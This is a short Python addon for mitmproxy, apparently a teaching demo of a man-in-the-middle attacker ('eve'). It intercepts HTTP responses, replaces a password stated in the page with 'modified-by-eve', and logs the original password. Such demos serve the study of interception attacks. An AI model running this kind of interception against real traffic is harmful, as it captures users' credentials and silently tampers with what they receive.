from mitmproxy import http, ctx
import re


pattern = re.compile(r'(The password is )"([^"]*)"')
new_password = "modified-by-eve"


def response(flow: http.HTTPFlow) -> None:
    original_content = flow.response.content.decode()
    m = pattern.search(original_content)
    if m:
        original_password = m.group(2)
        flow.response.content = pattern.sub(fr'\1"{new_password}"', original_content).encode()
        ctx.log.info(f"Replaced password {original_password} with {new_password}")

